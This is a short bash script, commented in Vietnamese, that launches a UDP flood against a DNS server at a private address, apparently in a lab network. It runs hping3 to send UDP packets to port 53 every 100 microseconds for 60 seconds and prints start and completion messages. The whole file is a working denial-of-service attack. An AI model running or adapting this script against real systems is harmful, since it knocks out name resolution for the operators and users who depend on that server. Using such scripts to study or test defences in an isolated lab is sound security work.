
#!/bin/bash
# Kich ban tan cong UDP Flood (vao may DNS)
VICTIM=10.0.2.11
DURATION=60

echo "Bat dau UDP Flood vao $VICTIM trong $DURATION giay..."
timeout $DURATION hping3 --udp -p 53 -i u100 $VICTIM
echo "Hoan tat tan cong UDP Flood!"

